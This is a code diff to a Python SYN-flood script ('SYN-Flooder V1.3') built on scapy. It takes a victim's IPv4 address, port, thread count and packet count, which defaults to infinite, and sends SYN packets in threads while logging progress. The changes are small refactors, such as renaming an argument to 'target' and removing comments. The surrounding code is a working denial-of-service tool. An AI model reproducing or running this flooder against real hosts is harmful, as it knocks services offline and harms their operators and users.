@@ -9,7 +9,6 @@ from defaults import *
 from scapy.all import send, IP, TCP
 
 
-# Configure the logger
 logging.basicConfig(level=logging.INFO,
                     format='%(asctime)s [%(levelname)s] %(message)s',
                     handlers=[logging.FileHandler("syn_flooder.log"), logging.StreamHandler()])
@@ -24,7 +23,7 @@ def random_ipv4_address() -> str:
 def get_args() -> tuple:
     parser = argparse.ArgumentParser(
         description="Welcome to SYN-Flooder V1.3\n")
-    parser.add_argument('x', help="Victims IPv4-address")
+    parser.add_argument('target', help="Victims IPv4-address")
     parser.add_argument(
         '-a', type=int, help="Amount of packets (default are infinity)", default=DEFAULT_PACKETS)
     parser.add_argument(
@@ -34,7 +33,7 @@ def get_args() -> tuple:
     parser.add_argument(
         '-p', type=int, help="Destination Port (default is 80)", default=DEFAULT_DESTINATION_PORT)
     args = parser.parse_args()
-    return args.x, args.p, args.t, args.a, args.s
+    return args.target, args.p, args.t, args.a, args.s
 
 
 def syn_flood_thread(target_ip: int, d_port: int, packets_to_send: int, time_limit: int):
@@ -51,12 +50,11 @@ def syn_flood_thread(target_ip: int, d_port: int, packets_to_send: int, time_lim
         send(packet, verbose=0)
         packets_sent += 1
 
-        # Print feedback for every X packets sent
         if packets_sent % 100 == 0:
             elapsed_time = time.time() - start_time
             logger.info(
                 f"Thread sent {packets_sent} packets in {elapsed_time:.2f} seconds.")
-    
+
     elapsed_time = time.time() - start_time
     logger.info(f"Thread finished after {elapsed_time:.2f} seconds!")
 
